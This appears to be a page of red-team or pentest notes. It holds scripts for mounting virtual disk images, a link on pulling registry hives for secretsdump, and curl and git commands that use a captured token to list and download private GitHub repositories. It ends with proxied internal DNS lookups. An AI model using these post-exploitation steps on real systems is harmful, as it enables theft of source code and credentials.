# Misc. Methods

## Raiding Virtual Disk Images

### allenyllee scripts

#### Install

Source: https://gist.github.com/allenyllee/0a4c02952bf695470860b27369bbb60d

```
#!/bin/bash

# install qemu utils
sudo apt install qemu-utils

# install nbd client
sudo apt install nbd-client
```

#### Mount

```
#!/bin/bash

VHDX_IMG="$1"
MOUNT_POINT="$2"

# [ubuntu] How do you mount a VHD image
# https://ubuntuforums.org/showthread.php?t=2299701
# 

# Load the nbd kernel module.
sudo rmmod nbd;sudo modprobe nbd max_part=16

# mount block device
sudo qemu-nbd -c /dev/nbd0 "$VHDX_IMG"

# reload partition table
sudo partprobe /dev/nbd0

# mount partition
sudo mount -o rw,nouser /dev/nbd0p1 "$MOUNT_POINT"
```

#### Unmount

```
#!/bin/bash

MOUNT_POINT="$1"

#unmount & remove nbd module
sudo umount "$MOUNT_POINT" && sudo qemu-nbd -d /dev/nbd0 && sudo rmmod nbd
```

### Loot

[Pull registry hive & parse with secretsdump](https://drmarmar.com/posts/vmdk/)

## Raiding Github

### Access Tokens

```
# source: @thesubtlety 

# list repos
curl -v -k -H "Content-type:application/json" -H "Authorization: Token <token> " https://github.domain.com/api/v3/user/repos | tee repos.txt

# list repo URLs
cat repos.txt | jq '.[] | select(.private==true)' | jq '.url'

# nab repo
curl -L -v -k -H "Content-type:application/json" -H "Authorization: Token <token>" https://github.domain.com/api/v3/repos/USER/REPO/tarball/master > repo.tar.gz

# or
git clone https://<username>:<githubtoken>@github.com/repo/path
```

## Proxied DNS Lookups (proxychains+dig)

Specify the internal DNS server and force the connection over TCP:

```
proxychains4 dig sub.domain.local @INTERNAL_DNS_SRV +vc
```